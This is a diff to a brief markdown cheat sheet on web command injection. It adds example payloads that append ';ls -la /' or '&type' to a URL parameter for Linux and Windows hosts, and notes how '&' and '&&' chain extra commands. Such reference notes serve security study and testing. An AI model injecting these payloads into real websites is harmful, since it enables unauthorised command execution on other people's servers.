@@ -1,9 +1,10 @@
 # Command Injection
 
-## The power of ";"
+## The power of \*nix ";" or Windows "&"
 
 ```
-url/ENDPOINT?PARAMETRE=;ls+-la+/'
+url/ENDPOINT?PARAMETRE=;ls+-la+/' # Linux Host
+PARAMETRE=&type  # Windows Host
 ```
 
 %2F is url encoded forward slash. & and && to make additional commands to the payload that simply an shell one liner injected into a website.  
